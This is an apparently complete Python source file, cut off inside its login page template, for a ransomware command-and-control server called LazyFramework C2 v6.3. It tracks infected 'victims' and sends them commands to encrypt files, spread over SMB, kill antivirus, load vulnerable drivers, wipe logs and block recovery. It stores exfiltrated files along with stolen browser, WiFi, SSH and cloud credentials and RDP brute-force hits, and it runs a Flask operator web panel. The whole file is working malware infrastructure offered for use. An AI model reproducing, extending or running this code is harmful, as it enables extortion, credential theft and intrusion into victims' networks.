#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "C2 Server",
    "description": "Command & Control Server v6.3 with HYBRID tracking, login auth, post-exploit handler, AV Killer, BYOVD, SMB Worm, Exfiltration, and GUI control",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Normal",
    "types": "payloads",
    "category": "payloads",
    "dependencies": ["flask"],
}

OPTIONS = {
    "LHOST": {
        "default": "0.0.0.0",
        "required": True,
        "description": "Listen IP address",
    },
    "LPORT": {"default": 4444, "required": True, "description": "Listen port (C2 TCP)"},
    "WEB_PORT": {"default": 5000, "required": True, "description": "Web panel port"},
    "C2_USERNAME": {
        "default": "admin",
        "required": False,
        "description": "Web panel username",
    },
    "C2_PASSWORD": {
        "default": "admin",
        "required": False,
        "description": "Web panel password (change this!)",
    },
}

import os
import sys
import json
import threading
import socket
import time
import subprocess
import base64
import hashlib
import secrets
from datetime import datetime

# ==================== C2 SERVER ====================


class C2Server:
    def __init__(self, host, port, web_port, password, username="admin"):
        self.host = host
        self.port = port
        self.web_port = web_port
        self.password = password
        self.username = username
        self.victims = {}
        self.running = False
        self.socket = None
        self.web_thread = None
        self.client_id_counter = 0
        self.lock = threading.Lock()
        self.command_history = []
        self.exfil_dir = os.path.join(os.getcwd(), "exfiltrated")
        os.makedirs(self.exfil_dir, exist_ok=True)

        # Keys folder untuk hybrid tracking
        self.keys_dir = os.path.join(os.getcwd(), "victim_keys")
        os.makedirs(self.keys_dir, exist_ok=True)

        # ═══ POST-EXPLOITATION STORAGE ═══
        self.post_exploit_dir = os.path.join(os.getcwd(), "post_exploit")
        os.makedirs(self.post_exploit_dir, exist_ok=True)

        # Credentials DB
        self.credentials_db = os.path.join(self.post_exploit_dir, "credentials.json")
        self.discovery_db = os.path.join(self.post_exploit_dir, "discovery.json")

        # Exfil chunks buffer
        self.exfil_buffer = {}

        self.hybrid_victims_log = os.path.join(self.keys_dir, "hybrid_victims.log")
        self.access_log = os.path.join(os.getcwd(), "c2_access.log")

        # ═══ FIX v6.3: CALLBACK untuk GUI (victim register notification) ═══
        self.on_victim_registered = None

    # ═══════════════════════════════════════════════════════════════
    # ACCESS LOGGING
    # ═══════════════════════════════════════════════════════════════
    def _log_access(self, msg):
        try:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.access_log, "a", encoding="utf-8") as f:
                f.write(f"{ts} | {msg}\n")
        except Exception:
            pass

    def start(self):
        """Start C2 Server"""
        self.running = True

        # TCP Listener
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(50)

        print("=" * 70)
        print("LAZYFRAMEWORK C2 SERVER v6.3 (HYBRID + AUTH + POST-EXPLOIT)")
        print("=" * 70)
        print(f"[*] C2 TCP listening on {self.host}:{self.port}")
        print(f"[*] Web panel on http://{self.host}:{self.web_port}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Password: {self.password}")
        print(f"[*] Exfiltrated files: {self.exfil_dir}")
        print(f"[*] Post-exploit data: {self.post_exploit_dir}")
        print(f"[*] Victim keys log: {self.keys_dir}")
        print(f"[*] Access log: {self.access_log}")
        print("=" * 70)
        print("[*] Commands: encrypt, decrypt, status, ping, wallpaper, note,")
        print("             wipe_logs, anti_recovery, byovd, spread, av_kill,")
        print("             exfiltrate, show_gui, decrypt_gui, kill")
        print("=" * 70)
        print("[!] HYBRID mode: decrypt via C2 akan DITOLAK")
        print("[!] Use RSA private key + victim GUI untuk decrypt")
        print("=" * 70)

        # Web panel thread
        self.web_thread = threading.Thread(target=self._run_web_panel, daemon=True)
        self.web_thread.start()

        # Cleanup thread
        threading.Thread(target=self._cleanup_thread, daemon=True).start()

        # Main accept loop
        while self.running:
            try:
                self.socket.settimeout(1.0)
                client, addr = self.socket.accept()
                self.client_id_counter += 1
                client_id = f"victim_{self.client_id_counter}"

                with self.lock:
                    self.victims[client_id] = {
                        "id": client_id,
                        "ip": addr[0],
                        "port": addr[1],
                        "status": "connected",
                        "registered": False,  # ← FIX v6.3
                        "socket": client,
                        "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "os": "unknown",
                        "hostname": "unknown",
                        "user": "unknown",
                        "is_admin": False,
                        "decrypt_key": "",
                        "encryption": "",
                        "encryption_mode": "unknown",
                        "victim_id": "",
                        "key_fingerprint": "",
                        "original_victim_id": "",  # ← FIX v6.3
                        "byovd_enabled": False,
                        "smb_worm_enabled": False,
                        "av_bypass": False,
                        "encrypted": False,
                        "encrypted_count": 0,
                        "exfiltrated_count": 0,
                        "last_exfil": "",
                        "messages": [],
                        # Post-exploit data
                        "post_exploit": {},
                        "post_exploit_file": "",
                        "creds_count": 0,
                    }

                print(f"[+] New victim: {client_id} from {addr[0]}:{addr[1]}")
                self._log_access(f"NEW_VICTIM id={client_id} ip={addr[0]}")

                threading.Thread(
                    target=self._handle_client,
                    args=(client, addr, client_id),
                    daemon=True,
                ).start()

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[!] Accept error: {e}")

    def _cleanup_thread(self):
        while self.running:
            time.sleep(300)
            with self.lock:
                if len(self.command_history) > 1000:
                    self.command_history = self.command_history[-500:]

    # ═══════════════════════════════════════════════════════════════
    # FIX v6.3: Robust client handler
    # ═══════════════════════════════════════════════════════════════
    def _handle_client(self, client, addr, client_id):
        """
        FIX v6.3:
        - Timeout 5s → 60s
        - Deteksi register_received
        - Deteksi EOF vs timeout
        - Log detail pada disconnect
        - Heartbeat ping untuk keep-alive
        """
        try:
            client.settimeout(60)
            buffer = ""
            last_data_time = time.time()
            register_received = False
            bytes_received = 0

            while self.running:
                try:
                    data = client.recv(16384).decode("utf-8", errors="ignore")
                    if not data:
                        print(f"[!] Client {client_id} closed connection (EOF)")
                        break

                    last_data_time = time.time()
                    bytes_received += len(data)
                    buffer += data

                    while "\n" in buffer:
                        line, buffer = buffer.split("\n", 1)
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            msg = json.loads(line)
                            if msg.get("type") == "register":
                                register_received = True
                            self._process_message(client_id, client, msg)
                        except json.JSONDecodeError:
                            print(f"[!] Invalid JSON from {client_id}: {line[:100]}")

                except socket.timeout:
                    # Belum register & sudah >30s → tutup
                    if not register_received and time.time() - last_data_time > 30:
                        print(f"[!] Client {client_id} no register after 30s, closing")
                        break
                    # Heartbeat untuk yang sudah register
                    if register_received:
                        try:
                            ping = json.dumps({"type": "ping"}) + "\n"
                            client.send(ping.encode())
                        except Exception:
                            break
                    continue

                except (
                    ConnectionResetError,
                    ConnectionAbortedError,
                    BrokenPipeError,
                ) as e:
                    print(
                        f"[!] Client {client_id} connection reset: {type(e).__name__}: {e}"
                    )
                    break

                except OSError as e:
                    print(f"[!] Client {client_id} socket error: {e}")
                    break

                except Exception as e:
                    print(f"[!] Client {client_id} error: {type(e).__name__}: {e}")
                    import traceback

                    traceback.print_exc()
                    break

        except Exception as e:
            print(f"[!] Handler error: {e}")
            import traceback

            traceback.print_exc()

        finally:
            with self.lock:
                if client_id in self.victims:
                    v = self.victims[client_id]
                    v["status"] = "disconnected"
                    v["disconnect_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    print(f"[-] Victim disconnected: {client_id}")
                    print(f"    Bytes received: {bytes_received}")
                    print(f"    Register received: {register_received}")
                    print(f"    Hostname: {v.get('hostname', 'unknown')}")
                    print(f"    OS: {v.get('os', 'unknown')}")
                    print(f"    User: {v.get('user', 'unknown')}")

            try:
                client.close()
            except Exception:
                pass

    def _process_message(self, client_id, client, msg):
        with self.lock:
            if client_id not in self.victims:
                return

            victim = self.victims[client_id]
            victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            msg_type = msg.get("type", "")

            victim["messages"].append(msg)
            if len(victim["messages"]) > 200:
                victim["messages"] = victim["messages"][-200:]

            # === Register ===
            if msg_type == "register":
                victim["os"] = msg.get("os", "unknown") or "unknown"
                victim["hostname"] = msg.get("hostname", "unknown") or "unknown"
                victim["user"] = msg.get("user", "unknown") or "unknown"
                victim["is_admin"] = bool(msg.get("is_admin", False))
                victim["decrypt_key"] = msg.get("decrypt_key", "")
                victim["encryption"] = msg.get("encryption", "")
                victim["byovd_enabled"] = bool(msg.get("byovd", False))
                victim["smb_worm_enabled"] = bool(msg.get("smb_worm", False))
                victim["av_bypass"] = bool(msg.get("av_bypass", False))
                victim["status"] = "registered"
                victim["registered"] = True

                # ═══ FIX v6.3: Simpan victim_id ASLI terpisah ═══
                original_vid = msg.get("victim_id", "") or ""
                victim["victim_id"] = original_vid or client_id
                victim["original_victim_id"] = original_vid
                victim["key_fingerprint"] = msg.get("key_fingerprint", "")

                enc_str = msg.get("encryption", "").lower()
                if "hybrid" in enc_str or "rsa" in enc_str:
                    victim["encryption_mode"] = "hybrid"
                else:
                    victim["encryption_mode"] = "legacy"

                print(f"[+] Victim {client_id} registered:")
                print(f"    Hostname: {victim['hostname']}")
                print(f"    OS: {victim['os']}")
                print(f"    User: {victim['user']}")
                print(f"    Admin: {victim['is_admin']}")
                print(f"    Mode: {victim['encryption_mode'].upper()}")
                if victim["victim_id"]:
                    print(f"    Victim ID: {victim['victim_id']}")
                if victim["key_fingerprint"]:
                    print(f"    Key Fingerprint: {victim['key_fingerprint']}")

                if victim["encryption_mode"] == "hybrid" and victim["victim_id"]:
                    try:
                        with open(self.hybrid_victims_log, "a", encoding="utf-8") as f:
                            f.write(
                                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | "
                                f"{client_id} | {victim['victim_id']} | "
                                f"{victim['key_fingerprint']} | "
                                f"{victim['hostname']} | {victim['ip']}\n"
                            )
                    except Exception as e:
                        print(f"[!] Failed to log hybrid victim: {e}")

                # ═══ FIX v6.3: CALLBACK ke GUI ═══
                if self.on_victim_registered:
                    try:
                        self.on_victim_registered(
                            {
                                "id": client_id,
                                "ip": victim["ip"],
                                "port": victim["port"],
                                "hostname": victim["hostname"],
                                "os": victim["os"],
                                "user": victim["user"],
                                "is_admin": victim["is_admin"],
                                "victim_id": victim["victim_id"],
                                "key_fingerprint": victim["key_fingerprint"],
                                "encryption_mode": victim["encryption_mode"],
                            }
                        )
                    except Exception as e:
                        print(f"[!] on_victim_registered callback error: {e}")

            # === Encrypt ===
            elif msg_type == "encrypt_response":
                victim["encrypted"] = msg.get("status") == "success"
                victim["encrypted_count"] = msg.get("files_encrypted", 0)
                victim["status"] = "encrypted" if victim["encrypted"] else "registered"
                enc_type = msg.get(
                    "encryption", victim.get("encryption_mode", "unknown")
                )
                print(
                    f"[+] Victim {client_id} encrypted "
                    f"{victim['encrypted_count']} files "
                    f"(mode: {enc_type})"
                )

            # === Decrypt ===
            elif msg_type == "decrypt_response":
                status = msg.get("status", "unknown")
                if status == "denied":
                    reason = msg.get("message", "Unknown reason")
                    print(f"[!] Victim {client_id} DENIED decrypt: {reason}")
                    victim["status"] = "registered"
                    if victim.get("encryption_mode") == "hybrid":
                        print(f"    → Use RSA private key + victim GUI instead")
                else:
                    victim["encrypted"] = False
                    victim["encrypted_count"] = 0
                    victim["status"] = "decrypted"
                    victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                    method = msg.get("method", "c2")
                    files = msg.get("files_decrypted", 0)
                    print(
                        f"[+] Victim {client_id} decrypted {files} files (via {method})"
                    )

                    self.command_history.append(
                        {
                            "client_id": client_id,
                            "command": f"decrypt ({files} files via {method})",
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "status": "success",
                        }
                    )

            # === Status ===
            elif msg_type == "status_response":
                victim["encrypted"] = msg.get("encrypted", False)
                victim["encrypted_count"] = msg.get("encrypted_files", 0)
                victim["is_admin"] = msg.get("is_admin", victim["is_admin"])
                victim["status"] = "active"

                mode = msg.get("encryption_mode", "")
                if mode:
                    victim["encryption_mode"] = mode
                vid = msg.get("victim_id", "")
                if vid and not victim.get("victim_id"):
                    victim["victim_id"] = vid
                fp = msg.get("key_fingerprint", "")
                if fp and not victim.get("key_fingerprint"):
                    victim["key_fingerprint"] = fp

                print(
                    f"[+] Victim {client_id} status: "
                    f"encrypted={victim['encrypted']} "
                    f"admin={victim['is_admin']} "
                    f"mode={victim.get('encryption_mode', '?')}"
                )

            # === BYOVD ===
            elif msg_type == "byovd_response":
                status = msg.get("status", "unknown")
                victim["is_admin"] = msg.get("is_admin", False)
                print(f"[+] Victim {client_id} BYOVD: {status}")

            # === Spread ===
            elif msg_type == "spread_response":
                status = msg.get("status", "unknown")
                hosts = msg.get("hosts", 0)
                print(f"[+] Victim {client_id} SMB spread: {status} ({hosts} hosts)")

            # === Wipe logs ===
            elif msg_type == "wipe_logs_response":
                items = msg.get("items", 0)
                print(f"[+] Victim {client_id} wiped {items} items")

            # === Anti-recovery ===
            elif msg_type == "anti_recovery_response":
                print(f"[+] Victim {client_id} anti-recovery: {msg.get('status')}")

            # === AV Kill ===
            elif msg_type == "av_kill_response":
                print(f"[+] Victim {client_id} AV kill: {msg.get('status')}")

            # === Exfiltrate response (legacy) ===
            elif msg_type == "exfiltrate_response":
                count = msg.get("files_exfiltrated", 0)
                victim["exfiltrated_count"] = victim.get("exfiltrated_count", 0) + count
                victim["last_exfil"] = datetime.now().strftime("%H:%M:%S")
                print(
                    f"[+] Victim {client_id} exfiltrated {count} files "
                    f"(total: {victim['exfiltrated_count']})"
                )

            # === Show GUI response ===
            elif msg_type == "show_gui_response":
                print(f"[+] Victim {client_id} GUI shown: {msg.get('status')}")

            # === Decrypt GUI response ===
            elif msg_type == "decrypt_gui_response":
                print(f"[+] Victim {client_id} decrypt GUI shown: {msg.get('status')}")

            # === Pong ===
            elif msg_type == "pong":
                # Silent heartbeat
                pass

            # === Kill ===
            elif msg_type == "kill_response":
                victim["status"] = "killed"
                print(f"[+] Victim {client_id} killed")

            # ═══ POST-EXPLOIT RESULTS ═══
            elif msg_type == "post_exploit":
                action = msg.get("action", "")
                if action == "results":
                    data = msg.get("data", {})
                    self._handle_post_exploit(client_id, data)

            # === RDP Enable Response ===
            elif msg_type == "rdp_enable_response":
                status = msg.get("status", "unknown")
                data = msg.get("data", {})
                if status == "success":
                    victim["rdp_enabled"] = True
                    victim["rdp_info"] = data.get("connection_info", {})
                    ci = data.get("connection_info", {})
                    print(f"[+] Victim {client_id} RDP ENABLED")
                    print(f"    Host: {ci.get('host', '?')}:{ci.get('port', '?')}")
                    print(f"    User: {ci.get('username', '?')}")
                    print(f"    Pass: {ci.get('password', '?')}")
                    print(f"    Proto: {ci.get('protocol', '?')}")
                else:
                    print(
                        f"[!] Victim {client_id} RDP enable failed: {data.get('error', '?')}"
                    )

            # === RDP Bruteforce Response ===
            elif msg_type == "rdp_bruteforce_response":
                status = msg.get("status", "unknown")
                result = msg.get("result", {})
                target = result.get("target", msg.get("target", "?"))

                if status == "started":
                    print(f"[*] Victim {client_id} started bruteforce on {target}")
                elif status == "success":
                    hits = result.get("hits", [])
                    print(
                        f"[★] Victim {client_id} BRUTEFORCE HIT on {target} "
                        f"({result.get('attempts', 0)} attempts)"
                    )
                    for h in hits:
                        print(f"    ✓ {h.get('username')}:{h.get('password')}")

                    victim.setdefault("bruteforce_hits", []).extend(hits)
                    for h in hits:
                        victim.setdefault("found_creds", []).append(
                            {
                                "source": "rdp_bruteforce",
                                "target": target,
                                "username": h.get("username"),
                                "password": h.get("password"),
                                "timestamp": datetime.now().isoformat(),
                            }
                        )
                elif status == "no_hit":
                    print(
                        f"[-] Victim {client_id} bruteforce {target}: no hit "
                        f"({result.get('attempts', 0)} attempts)"
                    )
                else:
                    print(
                        f"[!] Victim {client_id} bruteforce error: {msg.get('message')}"
                    )

            # ═══ EXFIL FILE CHUNKED ═══
            elif msg_type == "exfil":
                action = msg.get("action", "")
                if action == "start":
                    self._handle_exfil_start(client_id, msg)
                elif action == "chunk":
                    self._handle_exfil_chunk(client_id, msg)
                elif "filename" in msg and "content" in msg:
                    self._handle_exfil_legacy(client_id, msg)

            # === Exfiltrated file data (legacy) ===
            elif msg_type == "exfiltrate":
                filename = msg.get("filename", "unknown")
                content = msg.get("content", "")
                size = msg.get("size", 0)
                print(f"[+] Received exfil: {filename} ({size:.2f}MB) from {client_id}")
                try:
                    vdir = os.path.join(self.exfil_dir, client_id)
                    os.makedirs(vdir, exist_ok=True)
                    safe_name = os.path.basename(filename)
                    target = os.path.join(vdir, safe_name)
                    if os.path.exists(target):
                        base, ext = os.path.splitext(safe_name)
                        ts = datetime.now().strftime("%H%M%S")
                        target = os.path.join(vdir, f"{base}_{ts}{ext}")

                    with open(target, "wb") as f:
                        f.write(base64.b64decode(content))
                    print(f"[+] Saved to: {target}")
                except Exception as e:
                    print(f"[!] Exfil save error: {e}")

            else:
                print(f"[?] Unknown msg type from {client_id}: {msg_type}")

    # ═══════════════════════════════════════════════════════════════
    # POST-EXPLOIT HANDLER
    # ═══════════════════════════════════════════════════════════════

    def _handle_post_exploit(self, client_id, data):
        """Handle post-exploit results from victim."""
        try:
            print("")
            print("=" * 70)
            print(f"[+] POST-EXPLOIT RESULTS FROM {client_id}")
            print("=" * 70)

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_file = os.path.join(
                self.post_exploit_dir, f"{client_id}_{ts}_post_exploit.json"
            )

            with open(out_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, default=str)

            print(f"[+] Saved: {out_file}")

            # ═══ SUMMARY ═══
            creds = data.get("credentials", {})
            creds_count = sum(
                len(v) if isinstance(v, list) else 0 for v in creds.values()
            )
            print(f"[+] Credentials: {creds_count}")

            browser = creds.get("browser", [])
            if browser:
                print(f"    Browser: {len(browser)}")
                for c in browser[:5]:
                    url = (c.get("url", "") or "")[:50]
                    user = c.get("username", "") or ""
                    print(f"      - {c.get('browser', '?')} | {url} | {user}")

            wifi = creds.get("wifi", [])
            if wifi:
                print(f"    WiFi: {len(wifi)}")
                for c in wifi[:5]:
                    print(f"      - SSID: {c.get('ssid', '?')}")

            ssh = creds.get("ssh", [])
            if ssh:
                print(f"    SSH keys: {len(ssh)}")

            cloud = creds.get("cloud", [])
            if cloud:
                print(f"    Cloud creds: {len(cloud)}")

            disc = data.get("discovery", {})
            if disc:
                sys_info = disc.get("system", {})
                print(
                    f"[+] System: {sys_info.get('hostname', '?')} ({sys_info.get('os', '?')})"
                )
                print(
                    f"    User: {sys_info.get('user', '?')} (admin={sys_info.get('is_admin', False)})"
                )
                users_info = disc.get("users", {})
                if isinstance(users_info, dict):
                    print(f"    Users: {len(users_info.get('users', []))}")
                shares_info = disc.get("shares", {})
                if isinstance(shares_info, dict):
                    print(f"    Shares: {len(shares_info.get('local', []))}")

            exfil = data.get("exfiltration", {})
            if exfil:
                print(f"[+] Exfil: {exfil.get('collected', 0)} files collected")
                print(f"    Archives: {exfil.get('archives', 0)}")
                print(f"    Uploaded: {exfil.get('uploaded', 0)}")

            print("=" * 70)

            with self.lock:
                if client_id in self.victims:
                    self.victims[client_id]["post_exploit"] = data
                    self.victims[client_id]["post_exploit_file"] = out_file
                    self.victims[client_id]["creds_count"] = creds_count

            self.command_history.append(
                {
                    "client_id": client_id,
                    "command": f"post_exploit ({creds_count} creds)",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "status": "success",
                }
            )

        except Exception as e:
            print(f"[!] Post-exploit handler error: {e}")
            import traceback

            traceback.print_exc()

    # ═══════════════════════════════════════════════════════════════
    # EXFIL CHUNKED HANDLER
    # ═══════════════════════════════════════════════════════════════

    def _handle_exfil_start(self, client_id, msg):
        try:
            filename = msg.get("filename", "unknown")
            size = msg.get("size", 0)
            print(f"[+] Exfil start: {filename} ({size:,} bytes) from {client_id}")
            self.exfil_buffer[client_id] = {
                "filename": filename,
                "size": size,
                "chunks": [],
                "received": 0,
                "started": time.time(),
            }
        except Exception as e:
            print(f"[!] Exfil start error: {e}")

    def _handle_exfil_chunk(self, client_id, msg):
        try:
            if client_id not in self.exfil_buffer:
                print(f"[!] Exfil chunk without start from {client_id}")
                return

            index = msg.get("index", 0)
            data_b64 = msg.get("data", "")

            buf = self.exfil_buffer[client_id]
            buf["chunks"].append((index, data_b64))
            buf["received"] += len(data_b64)

            if buf["received"] >= buf["size"] * 1.3:
                self._finalize_exfil(client_id)
        except Exception as e:
            print(f"[!] Exfil chunk error: {e}")

    def _finalize_exfil(self, client_id):
        try:
            if client_id not in self.exfil_buffer:
                return

            buf = self.exfil_buffer.pop(client_id)
            filename = buf["filename"]

            chunks = sorted(buf["chunks"], key=lambda x: x[0])
            combined = b""
            for idx, chunk_b64 in chunks:
                try:
                    combined += base64.b64decode(chunk_b64)
                except Exception:
                    pass

            victim_dir = os.path.join(self.exfil_dir, client_id)
            os.makedirs(victim_dir, exist_ok=True)

            safe_name = os.path.basename(filename)
            target = os.path.join(victim_dir, safe_name)

            if os.path.exists(target):
                base, ext = os.path.splitext(safe_name)
                ts = datetime.now().strftime("%H%M%S")
                target = os.path.join(victim_dir, f"{base}_{ts}{ext}")

            with open(target, "wb") as f:
                f.write(combined)

            size = os.path.getsize(target)
            print(f"[+] Exfil complete: {target} ({size:,} bytes)")

            with self.lock:
                if client_id in self.victims:
                    self.victims[client_id]["exfiltrated_count"] = (
                        self.victims[client_id].get("exfiltrated_count", 0) + 1
                    )
        except Exception as e:
            print(f"[!] Exfil finalize error: {e}")

    def _handle_exfil_legacy(self, client_id, msg):
        try:
            filename = msg.get("filename", "unknown")
            content = msg.get("content", "")

            victim_dir = os.path.join(self.exfil_dir, client_id)
            os.makedirs(victim_dir, exist_ok=True)

            safe_name = os.path.basename(filename)
            target = os.path.join(victim_dir, safe_name)

            with open(target, "wb") as f:
                f.write(base64.b64decode(content))

            print(f"[+] Exfil saved: {target}")
        except Exception as e:
            print(f"[!] Legacy exfil error: {e}")

    def send_command(self, client_id, command):
        with self.lock:
            if client_id not in self.victims:
                return False, "Victim not found"

            victim = self.victims[client_id]
            sock = victim.get("socket")

            if not sock:
                return False, "Victim socket not available"

            try:
                cmd_json = json.dumps(command) + "\n"
                sock.send(cmd_json.encode())
                victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                self.command_history.append(
                    {
                        "client_id": client_id,
                        "command": command.get("type", "unknown"),
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "status": "sent",
                    }
                )

                if command.get("type") == "decrypt":
                    mode = victim.get("encryption_mode", "unknown")
                    if mode == "hybrid":
                        print(f"[!] WARNING: {client_id} is HYBRID mode")
                        print(f"    → decrypt command akan DITOLAK oleh victim")
                        print(f"    → Decrypt hanya bisa dengan RSA private key")
                        print(
                            f"    → Fingerprint: {victim.get('key_fingerprint', 'N/A')}"
                        )
                        print(f"    → Victim ID: {victim.get('victim_id', 'N/A')}")

                return True, "Command sent"
            except Exception as e:
                return False, f"Failed to send: {e}"

    def send_command_all(self, command):
        results = []
        with self.lock:
            client_ids = list(self.victims.keys())

        for client_id in client_ids:
            victim = self.victims.get(client_id, {})
            if victim.get("status") in [
                "registered",
                "active",
                "encrypted",
                "decrypted",
            ]:
                success, msg = self.send_command(client_id, command)
                results.append((client_id, success, msg))

        return results

    def remove_victim(self, client_id):
        with self.lock:
            if client_id in self.victims:
                try:
                    sock = self.victims[client_id].get("socket")
                    if sock:
                        sock.close()
                except Exception:
                    pass
                del self.victims[client_id]
                return True
        return False

    # ==================== WEB PANEL ====================

    def _run_web_panel(self):
        try:
            from flask import (
                Flask,
                render_template_string,
                jsonify,
                request,
                send_from_directory,
                session,
                redirect,
                url_for,
                Response,
            )
            from functools import wraps

            app = Flask(__name__)
            app.secret_key = secrets.token_hex(32)
            app.permanent_session_lifetime = 3600  # 1 jam

            # ═══ PASSWORD HASHING ═══
            def _hash_password(password, salt=None):
                if salt is None:
                    salt = secrets.token_hex(16)
                dk = hashlib.pbkdf2_hmac(
                    "sha256", password.encode("utf-8"), salt.encode("utf-8"), 200_000
                )
                return f"pbkdf2:sha256:200000${salt}${dk.hex()}"

            def _verify_password(password, stored):
                try:
                    parts = stored.split("$")
                    if len(parts) != 3:
                        return False
                    method, salt, hash_hex = parts
                    if not method.startswith("pbkdf2:sha256"):
                        return False
                    iterations = int(method.split(":")[2])
                    dk = hashlib.pbkdf2_hmac(
                        "sha256",
                        password.encode("utf-8"),
                        salt.encode("utf-8"),
                        iterations,
                    )
                    return secrets.compare_digest(dk.hex(), hash_hex)
                except Exception:
                    return False

            _ADMIN_USERNAME = self.username
            _ADMIN_PASSWORD_HASH = _hash_password(self.password)

            # ═══ RATE LIMITING ═══
            _login_attempts = {}
            _LOCKOUT_DURATION = 300
            _MAX_ATTEMPTS = 5
            _WINDOW = 300

            def _check_rate_limit(ip):
                now = time.time()
                if ip not in _login_attempts:
                    return True, 0
                attempts = [t for t in _login_attempts[ip] if now - t[0] < _WINDOW]
                _login_attempts[ip] = attempts
                failed = [t for t in attempts if not t[1]]
                if len(failed) >= _MAX_ATTEMPTS:
                    oldest_fail = failed[0][0]
                    unlock_at = oldest_fail + _LOCKOUT_DURATION
                    remaining = int(unlock_at - now)
                    if remaining > 0:
                        return False, remaining
                    _login_attempts[ip] = []
                return True, 0

            def _record_attempt(ip, success):
                now = time.time()
                if ip not in _login_attempts:
                    _login_attempts[ip] = []
                _login_attempts[ip].append((now, success))
                if len(_login_attempts[ip]) > 50:
                    _login_attempts[ip] = _login_attempts[ip][-50:]

            # ═══ AUTH DECORATOR ═══
            def login_required(f):
                @wraps(f)
                def decorated(*args, **kwargs):
                    if not session.get("logged_in"):
                        if request.is_json or request.path.startswith("/api"):
                            return (
                                jsonify(
                                    {
                                        "success": False,
                                        "error": "authentication_required",
                                    }
                                ),
                                401,
                            )
                        return redirect(url_for("login", next=request.path))
                    return f(*args, **kwargs)

                return decorated

            # ═══ LOGIN TEMPLATE ═══
            LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login - LazyFramework C2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0a 100%);
            color: #e6edf3;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-container {
            width: 100%;
            max-width: 420px;
            background: linear-gradient(180deg, #161b22 0%, #0d1117 100%);
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 40px 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,0,0,0.1);
            position: relative;
            overflow: hidden;
        }
        .login-container::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 3px;
            background: linear-gradient(90deg, #ff0000, #ff6600, #ff0000);
            animation: scan 3s linear infinite;
            background-size: 200% 100%;
        }
        @keyframes scan {
            0% { background-position: -100% 0; }
            100% { background-position: 200% 0; }
        }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo-icon {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #ff0000, #ff6600);
            border-radius: 16px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            box-shadow: 0 0 30px rgba(255,0,0,0.4);
            margin-bottom: 12px;
        }
        .logo-title {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -0.5px;
            color: #fff;
        }
        .logo-sub {
            font-size: 12px;
            color: #8b949e;
            margin-top: 4px;
            letter-spacing: 1px;
        }
        .form-group { margin-bottom: 20px; }
        .form-label {
            display: block;
            font-size: 12px;
            color: #8b949e;
            margin-bottom: 8px;
            font-weight: 500;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        .form-input {
            width: 100%;
            padding: 12px 16px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            color: #e6edf3;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.2s;
        }
        .form-input:focus {
            outline: none;
            border-color: #ff0000;
            box-shadow: 0 0 0 3px rgba(255,0,0,0.1);
        }
        .form-input::placeholder { color: #484f58; }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(180deg, #da3633 0%, #a31515 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            margin-top: 8px;
        }
        .btn-login:hover {
            background: linear-gradient(180deg, #f85149 0%, #da3633 100%);
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(255,0,0,0.3);
        }
        .error-box {
            background: rgba(248, 81, 73, 0.1);
            border: 1px solid #f85149;
            color: #f85149;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid #21262d;
            font-size: 11px;
            color: #484f58;
        }
        .footer-dot { color: #ff0000; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <div class="logo-icon">☠</div>
            <div class="logo-title">LAZYFRAMEWORK C2</div>
            <div class="logo-sub">AUTHORIZED ACCESS ONLY</div>
        </div>

        {% if error %}
        <div class="error-box">
            <span>⚠</span>
            <span>{{ error }}</span>
        </div>
        {% endif %}

        {% if locked %}
        <div class="error-box">
            <span>🔒</span>
            <span>Too many failed attempts. Try again in {{ remaining }}s.</span>
        </div>
